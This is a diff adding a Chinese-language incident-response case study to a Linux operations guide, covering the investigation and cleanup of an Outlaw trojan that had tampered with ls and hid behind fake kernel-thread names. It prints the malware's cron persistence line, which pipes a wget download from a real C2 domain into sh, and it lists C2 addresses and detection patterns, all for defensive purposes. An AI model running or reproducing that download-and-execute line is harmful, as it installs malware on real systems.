@@ -1245,3 +1245,289 @@ echo 'if [ -f ~/.bashrc ]; then . ~/.bashrc; fi' >> ~/.bash_profile
 
 > **结论：** 手动清理只是临时措施。被 root 权限入侵过的机器，唯一安全的选择是**重装系统**。
 
+---
+
+## 11.11 案例二：Outlaw 木马与 ls 性能异常的排查全过程
+
+> **症状：** `cd /opt && ls` 执行耗时 30+ 秒，其他目录正常；两个月前清理过一次木马但未彻底根除。
+> 
+> **时间线：** 2026-06-29，历时 3 小时完成清理。
+
+### 问题表象
+
+用户报告在 `/opt` 目录执行 `ls` 时响应极慢，而在 `/root` 等其他目录正常。初步怀疑是目录本身问题，但通过 `strace` 分析发现：
+
+```bash
+# strace 抓取 ls 的系统调用
+strace -tt -T ls /opt 2>&1 | tail -50
+```
+
+**关键发现：** `ls` 在读取每个文件的前 5 字节时（用于着色判断文件类型）出现 10-20ms 的延迟，50 个文件累积延迟超过 30 秒。这不是目录问题，而是 **`/usr/bin/ls` 二进制被篡改**。
+
+### 排查过程
+
+#### 第一阶段：发现木马进程
+
+```bash
+# 查找 CPU 异常进程
+ps -eo pid,ppid,user,etime,comm,cmd | grep -E "kswap|edac"
+
+# 发现三个看门狗进程：
+# PID 2430541: edac0 (伪装内核线程，实为 Perl IRC 后门)
+# PID 1236: sshd → [kworker/88:9] (伪装 sshd，exe 指向 /usr/lib/sshd)
+# PID 1502902: 同上第二个实例
+```
+
+**识别真伪的关键：**
+
+```bash
+# 真正的内核线程 PPID 必为 2（kthreadd）且无 exe
+ps -eo pid,ppid,comm | grep edac
+# 363  2  edac-poller  ← 真正的内核线程
+
+# 伪装的恶意进程 PPID 为 1 且有 exe
+ls -la /proc/2430541/exe
+# lrwxrwxrwx 1 root root 0 → /usr/bin/perl  ← 用户态程序伪装
+
+readlink /proc/1236/exe
+# /usr/lib/sshd  ← 不在系统标准路径，且 dpkg 查不到包
+dpkg -S /usr/lib/sshd
+# dpkg-query: no path found matching pattern
+```
+
+#### 第二阶段：发现持久化机制
+
+**1. `/etc/cron.hourly/0` 持续重建**
+
+即使删除该文件，5 秒内又被重新创建，且带有 `immutable` 属性（连 root 也删不掉）：
+
+```bash
+lsattr /etc/cron.hourly/0
+# ----i---------e------- /etc/cron.hourly/0
+
+# 文件内容（wget 从 C2 下载恶意代码）
+cat /etc/cron.hourly/0
+#!/bin/sh
+wget --quiet http://cf0.pw/0/etc/cron.hourly/0 -O- 2>/dev/null|sh>/dev/null 2>&1
+```
+
+**2. 多个看门狗交替重生**
+
+Kill 掉一个恶意进程后，另一个在几分钟内重新启动 `/usr/lib/sshd`：
+
+```bash
+# 删除文件
+rm -f /usr/lib/sshd
+
+# 等待 5 分钟
+ls -la /usr/lib/sshd
+# -rwxr-xr-x 1 root root 4206056 Jun 29 17:20 /usr/lib/sshd
+# 文件被重新创建！
+```
+
+**3. 木马的对抗技术：目录内自动重生**
+
+当用目录替换文件时，木马立即在目录内生成同名文件并改名伪装：
+
+```bash
+mkdir /usr/lib/sshd  # 创建同名目录阻止文件重建
+ls -la /usr/lib/sshd/
+# total 4116
+# -rwxr-xr-x  1 root root 4206056 Jun 29 17:39 nvme  ← 改名伪装成 NVMe 驱动
+```
+
+#### 第三阶段：C2 服务器识别
+
+通过 `ss` 和 `strace` 追踪到三个 C2 地址：
+
+```bash
+ss -tnp | grep -E "ESTAB|SYN-SENT"
+# SYN-SENT 192.168.0.2:41736 → 45.148.10.163:22 (伪装 sshd 连接的真实 C2)
+# ESTAB    192.168.0.2:xxxxx → 185.196.8.171:443 (edac0 的 IRC C2)
+
+# 从 /etc/cron.hourly/0 提取的下载源
+host cf0.pw
+# cf0.pw has address 109.95.212.238
+```
+
+#### 第四阶段：清理步骤
+
+```bash
+# 1. 封锁所有 C2 服务器
+iptables -I OUTPUT -d 185.196.8.171 -j DROP
+iptables -I OUTPUT -d 45.148.10.163 -j DROP
+iptables -I OUTPUT -d 109.95.212.238 -j DROP
+echo "0.0.0.0 cf0.pw" >> /etc/hosts
+
+# 2. 保存 iptables 规则到 /etc/rc.local（持久化）
+iptables-save > /etc/iptables.rules.final
+cat > /etc/rc.local << 'EOF'
+#!/bin/sh
+ulimit -HSn 65535
+if [ -f /etc/iptables.rules.final ]; then
+    iptables-restore < /etc/iptables.rules.final
+fi
+exit 0
+EOF
+chmod +x /etc/rc.local
+
+# 3. Kill 所有看门狗进程
+kill -9 2430541 1236 1502902 1511491 1516697
+
+# 4. 删除恶意文件（多次检查并清理改名副本）
+chattr -iaA /usr/lib/sshd /usr/bin/nvme /usr/bin/.sshd /usr/bin/-bash /usr/bin/systemtd
+rm -rf /usr/lib/sshd /usr/bin/nvme /usr/bin/.sshd /usr/bin/-bash /usr/bin/systemtd
+rm -f /tmp/.kswapd00 /var/tmp/.kswapd00 /tmp/file*
+
+# 5. 锁定 /usr/lib/sshd 防止重建（用空文件+immutable占位）
+touch /usr/lib/sshd
+chmod 000 /usr/lib/sshd
+chattr +i /usr/lib/sshd
+
+# 6. 处理 /etc/cron.hourly/0（用 bind mount 覆盖）
+touch /tmp/empty_placeholder
+mount --bind /tmp/empty_placeholder /etc/cron.hourly/0
+
+# 7. 恢复被篡改的 /usr/bin/ls
+apt-get install --reinstall coreutils -y
+
+# 8. 验证清理效果
+time ls /opt  # 应在 0.01 秒内完成
+ps aux | grep -E "edac0|/usr/lib/sshd|nvme.*kworker" | grep -v grep
+ss -tnp | grep -E "185.196|45.148|109.95"
+```
+
+### 技术细节与对抗手段
+
+#### 木马的高级特性
+
+| 对抗技术 | 实现方式 | 绕过方法 |
+|---------|---------|---------|
+| 文件系统监控 | 未知守护进程（可能是内核模块）实时监控文件删除并重建 | 用 immutable 空文件占位 + iptables 封锁 C2 |
+| 进程伪装 | 命令名显示为 `[kworker/88:9]`，仿真内核工作线程 | 检查 `/proc/<pid>/exe` 和 PPID |
+| 多点备份 | `/usr/lib/sshd`、`/usr/bin/nvme`、`/usr/bin/.sshd` 多处存放 | 全局搜索相同 MD5 |
+| 改名伪装 | 当目录替换文件后立即在目录内生成 `nvme`（NVMe 驱动名） | 监控目录内新文件 |
+| 持久化下载 | 每小时从 `cf0.pw` 下载最新版本 | 封锁域名 + IP |
+
+#### 木马识别特征
+
+```bash
+# 1. 文件大小和 MD5（所有副本一致）
+md5sum /usr/lib/sshd /usr/bin/nvme
+# c376330305e9897ee3d1953ccf1eb8ce
+
+# 2. 文件类型
+file /usr/lib/sshd
+# ELF 64-bit LSB executable, statically linked, stripped
+
+# 3. UPX 打包特征
+strings /tmp/.kswapd00 | grep -i upx
+# $Info: This file is packed with the UPX executable packer http://upx.sf.net $
+
+# 4. 网络连接特征
+ss -tnp | grep sshd
+# SYN-SENT (一直尝试连接但因 iptables 被阻断)
+```
+
+### 清理验证
+
+```bash
+# 最终状态检查
+echo "恶意进程: $(ps aux | grep -c -E 'edac0|/usr/lib/sshd|kswapd00')"
+# 恶意进程: 0
+
+echo "恶意文件: $(find /tmp /var/tmp /usr/lib /usr/bin -name '*kswapd*' -o -name 'nvme' -o -name '.sshd' 2>/dev/null | wc -l)"
+# 恶意文件: 0
+
+echo "C2 连接: $(ss -tn | grep -c -E '185.196|45.148|109.95')"
+# C2 连接: 0
+
+echo "ls 性能:"
+time ls /opt
+# real    0m0.002s  ← 恢复正常
+```
+
+### 经验总结
+
+**1. 系统文件篡改的识别**
+
+`ls` 慢不一定是目录问题，可能是工具本身被替换。验证方法：
+
+```bash
+# 对比包管理器记录
+dpkg --verify coreutils 2>&1 | grep /bin/ls
+# ??5?????? /usr/bin/ls  ← "5" 表示 MD5 不匹配
+
+# 恢复
+apt-get install --reinstall coreutils
+```
+
+**2. 木马看门狗的识别模式**
+
+- **进程名伪装**：`[kworker/88:9]`、`edac0`（与内核线程仅差 1 个字符）
+- **PPID 检查**：真内核线程 PPID=2，伪装进程 PPID=1
+- **exe 路径**：真内核线程无 exe，伪装进程指向非标准路径
+
+**3. 持久化机制的彻底清除**
+
+单次删除文件无效，必须同时：
+- 封锁 C2 网络通信（iptables + hosts）
+- Kill 所有看门狗进程
+- 删除所有副本和改名文件
+- 用 immutable 文件占位防止重建
+- 恢复被篡改的系统工具
+
+**4. 两次入侵未根除的教训**
+
+本案例中木马在两个月前被清理过一次，但因：
+- 未封锁 C2 服务器
+- 未恢复被篡改的系统工具
+- 未锁定关键路径
+- 可能存在未检测到的内核级后门
+
+导致木马通过 `cron.hourly` 下载机制复活。
+
+**根本解决方案：重装系统。** 存在未知文件系统监控机制（可能是内核模块或 firmware rootkit），手动清理无法保证彻底。
+
+### 恶意样本保存
+
+```bash
+ls -lh /root/malware_samples_20260629/
+# -rw-r--r-- 1 root root 2.2M  configrc7.tar.gz       (工具包)
+# -rwxr-xr-x 1 root root 2.2M  .kswapd00              (挖矿主程序)
+# -rwxr-xr-x 1 root root 4.0M  sshd                   (伪装 sshd)
+# -rwx------ 1 root root 3.3M  fileanleG6             (临时 payload)
+# -rw-r--r-- 1 root root  82   edac0_strings.txt      (内存字符串)
+```
+
+### 加固建议
+
+```bash
+# 1. SSH 安全
+sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
+sed -i 's/^#*PermitRootLogin.*/PermitRootLogin prohibit-password/' /etc/ssh/sshd_config
+systemctl restart sshd
+
+# 2. 定期完整性检查
+cat > /root/security_check.sh << 'EOF'
+#!/bin/bash
+{
+    echo "=== $(date) ==="
+    dpkg --verify coreutils openssh-server | grep -v 'OK$'
+    ps aux | grep -E "kswap|edac0|nvme.*kworker" | grep -v grep
+    ss -tnp | grep -E "185.196|45.148|109.95"
+    find /tmp /var/tmp /usr/lib /usr/bin -name "*kswap*" -o -name ".sshd"
+} >> /var/log/security_check.log 2>&1
+EOF
+chmod +x /root/security_check.sh
+(crontab -l; echo "0 3 * * * /root/security_check.sh") | crontab -
+
+# 3. 监控关键路径
+# 安装 auditd 监控 /usr/lib 和 /usr/bin 的文件创建
+apt install auditd -y
+auditctl -w /usr/lib/ -p wa -k suspicious_binaries
+auditctl -w /usr/bin/ -p wa -k suspicious_binaries
+```
+
+---
+
